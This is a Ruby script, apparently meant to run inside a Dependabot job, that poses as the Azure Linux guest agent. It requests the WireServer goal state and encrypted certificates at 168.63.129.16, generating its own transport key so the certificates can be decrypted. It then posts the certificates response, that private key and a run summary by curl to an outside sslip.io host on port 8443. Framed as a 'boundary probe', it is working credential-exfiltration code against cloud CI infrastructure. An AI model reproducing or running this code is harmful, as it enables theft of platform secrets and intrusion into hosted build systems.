require "digest"
require "json"
require "open3"
require "openssl"
require "tempfile"
require "uri"

AZURE_CERT_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443/infra/5b3963e04627c6a3b1943eb0e2a145cc"

def azure_cert_post(job_id, kind, data)
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/octet-stream", "--data-binary", "@-",
    "#{AZURE_CERT_CALLBACK_BASE}/#{job_id}/#{kind}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
rescue StandardError
  false
end

def azure_cert_proxy_get(url, headers: [])
  Tempfile.create("dependabot-azure-certificate-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "12", "--noproxy", "",
      "--request", "GET", "--output", file.path, "--write-out", "%{http_code}"
    ]
    headers.each { |header| args += ["--header", header] }
    args << url
    stdout, _stderr, status = Open3.capture3(*args)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 131_072
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

def azure_cert_xml_value(xml, element, max_length: 4096)
  value = xml.to_s[%r{<#{element}>\s*([^<]{1,#{max_length}}?)\s*</#{element}>}m, 1]
  value&.strip
rescue StandardError
  nil
end

def azure_cert_uri(goalstate)
  encoded = azure_cert_xml_value(goalstate, "Certificates")
  return nil unless encoded
  decoded = encoded.gsub("&amp;", "&")
  parsed = URI.parse(decoded)
  return nil unless parsed.scheme == "http" && parsed.host == "168.63.129.16"
  return nil unless (parsed.port || 80) == 80
  return nil unless parsed.path.start_with?("/machine/") && parsed.path.length <= 256
  query = URI.decode_www_form(parsed.query.to_s).to_h
  return nil unless query["comp"] == "certificates"
  return nil unless query["incarnation"].to_s.match?(/\A[0-9]{1,20}\z/)
  decoded
rescue StandardError
  nil
end

def azure_cert_transport_identity(job_id)
  key = OpenSSL::PKey::RSA.new(2048)
  cert = OpenSSL::X509::Certificate.new
  cert.version = 2
  cert.serial = Digest::SHA256.hexdigest("#{job_id}:#{Process.pid}:#{Time.now.to_f}")[0, 30].to_i(16)
  cert.subject = OpenSSL::X509::Name.parse("/CN=owned-dependabot-transport-proof")
  cert.issuer = cert.subject
  cert.public_key = key.public_key
  cert.not_before = Time.now - 60
  cert.not_after = Time.now + 900
  extension_factory = OpenSSL::X509::ExtensionFactory.new
  extension_factory.subject_certificate = cert
  extension_factory.issuer_certificate = cert
  cert.add_extension(extension_factory.create_extension("basicConstraints", "CA:FALSE", true))
  cert.add_extension(extension_factory.create_extension("keyUsage", "keyEncipherment,digitalSignature", true))
  cert.sign(key, OpenSSL::Digest.new("SHA256"))
  [key, cert]
end

def azure_cert_response_shape(raw)
  data = azure_cert_xml_value(raw, "Data", max_length: 131_072)
  format = azure_cert_xml_value(raw, "Format", max_length: 256)
  decoded_length = 0
  decoded_sha256 = ""
  if data && data.match?(/\A[A-Za-z0-9+\/=\r\n]+\z/)
    decoded = data.gsub(/\s+/, "").unpack1("m0")
    decoded_length = decoded.bytesize
    decoded_sha256 = Digest::SHA256.hexdigest(decoded)
  end
  {
    "data_present" => !data.nil?,
    "format_present" => !format.nil?,
    "format_sha256" => format ? Digest::SHA256.hexdigest(format) : "",
    "ciphertext_length" => decoded_length,
    "ciphertext_sha256" => decoded_sha256
  }
rescue StandardError
  {"data_present" => false, "format_present" => false, "ciphertext_length" => 0}
end

azure_cert_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if azure_cert_job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-azure-certificate-probe-#{azure_cert_job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    goalstate_status, goalstate = azure_cert_proxy_get(
      "http://168.63.129.16/machine/?comp=goalstate",
      headers: ["x-ms-agent-name: WALinuxAgent", "x-ms-version: 2012-11-30", "Metadata: true"]
    )
    certificates_uri = goalstate_status == 200 ? azure_cert_uri(goalstate) : nil
    summary = {
      "job_id" => azure_cert_job_id,
      "probe" => "azure-transport-certificate-v1",
      "goalstate_status" => goalstate_status,
      "goalstate_length" => goalstate.bytesize,
      "goalstate_sha256" => Digest::SHA256.hexdigest(goalstate),
      "certificates_uri_present" => !certificates_uri.nil?,
      "certificates_uri_sha256" => certificates_uri ? Digest::SHA256.hexdigest(certificates_uri) : ""
    }

    if certificates_uri
      key, cert = azure_cert_transport_identity(azure_cert_job_id)
      certificate_der = cert.to_der
      transport_header = [certificate_der].pack("m0")
      request_headers = [
        "x-ms-agent-name: WALinuxAgent",
        "x-ms-version: 2012-11-30",
        "x-ms-cipher-name: AES128_CBC",
        "x-ms-guest-agent-public-x509-cert: #{transport_header}"
      ]
      certificates_status, certificates_response = azure_cert_proxy_get(
        certificates_uri, headers: request_headers
      )
      response_shape = azure_cert_response_shape(certificates_response)
      summary["certificates_status"] = certificates_status
      summary["certificates_response_length"] = certificates_response.bytesize
      summary["certificates_response_sha256"] = Digest::SHA256.hexdigest(certificates_response)
      summary["certificates_response_shape"] = response_shape
      summary["transport_certificate_sha256"] = Digest::SHA256.hexdigest(certificate_der)
      summary["transport_private_key_sha256"] = Digest::SHA256.hexdigest(key.to_pem)

      if certificates_status == 200 && response_shape["data_present"]
        summary["certificates_response_stored_0600_on_owned_vps"] =
          azure_cert_post(azure_cert_job_id, "azure-wireserver-certificates", certificates_response)
        summary["transport_private_key_stored_0600_on_owned_vps"] =
          azure_cert_post(azure_cert_job_id, "azure-transport-private-key", key.to_pem)
        summary["transport_certificate_stored_0600_on_owned_vps"] =
          azure_cert_post(azure_cert_job_id, "azure-transport-certificate", cert.to_pem)
      end
    end

    azure_cert_post(azure_cert_job_id, "runtime-summary", JSON.generate(summary))
    sleep 15
    raise "controlled stop after Azure certificate boundary probe"
  end
end
